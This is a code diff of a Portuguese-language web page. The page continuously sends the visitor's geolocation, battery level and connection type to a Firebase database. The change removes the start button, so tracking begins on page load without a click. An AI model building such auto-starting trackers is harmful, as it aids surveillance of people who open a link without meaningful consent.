@@ -12,9 +12,7 @@
 
 <body style="background:#0f0f0f;color:white;text-align:center;padding-top:100px;font-family:Arial">
 
-<h2>📍 Compartilhar localização</h2>
-
-<button onclick="start()">Iniciar</button>
+<h2>📍 Compartilhando localização...</h2>
 
 <script type="module">
 
@@ -36,32 +34,32 @@ appId:"1:877191590019:web:152d4d35bdd3024c53abb6"
 const app = initializeApp(firebaseConfig)
 const db = getDatabase(app)
 
-let id=localStorage.getItem("uid")
+let id = localStorage.getItem("uid")
 
 if(!id){
 
-id=Math.random().toString(36).substr(2,9)
+id = Math.random().toString(36).substr(2,9)
 localStorage.setItem("uid",id)
 
 }
 
-window.start=function(){
+function start(){
 
 navigator.geolocation.watchPosition(async pos=>{
 
-let lat=pos.coords.latitude
-let lng=pos.coords.longitude
+let lat = pos.coords.latitude
+let lng = pos.coords.longitude
 
-let bateria="N/A"
+let bateria = "N/A"
 
 if(navigator.getBattery){
 
-let bat=await navigator.getBattery()
-bateria=Math.floor(bat.level*100)+"%"
+let bat = await navigator.getBattery()
+bateria = Math.floor(bat.level*100)+"%"
 
 }
 
-let conexao=navigator.connection?navigator.connection.effectiveType:"N/A"
+let conexao = navigator.connection ? navigator.connection.effectiveType : "N/A"
 
 set(ref(db,"usuarios/"+id),{
 
@@ -78,7 +76,11 @@ data:Date.now()
 
 }
 
+/* inicia automaticamente */
+
+start()
+
 </script>
 
 </body>
-  </html>
+</html>
